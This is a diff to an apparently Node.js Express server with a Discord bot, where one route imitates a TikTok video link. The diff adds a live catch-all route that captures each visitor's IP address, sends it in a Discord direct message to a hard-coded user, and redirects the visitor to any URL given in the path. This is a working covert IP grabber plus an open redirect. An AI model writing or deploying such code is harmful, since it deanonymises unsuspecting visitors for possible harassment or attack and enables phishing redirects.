@@ -47,9 +47,12 @@ app.get('/https://www.tiktok.com/@zhtorr/video/7493515873487965448', async (_req
   //res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
   res.redirect('https://www.tiktok.com/@zhtorr/video/7493515873487965448?is_from_webapp=1&sender_device=pc')
 });
-// app.get('*', async (req, res) => {
-//   console.log(req.path)
-// })
+app.get('*', async (req, res) => {
+  const ip = req.ip || req.socket.remoteAddress
+  await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
+   console.log(req.url)
+   res.redirect(req.url.slice(1))
+ })
 app.post('/', (_req, res) => {
   logger.log('Recived post request');
   res.status(200).json({'hello world': 'hello world'});
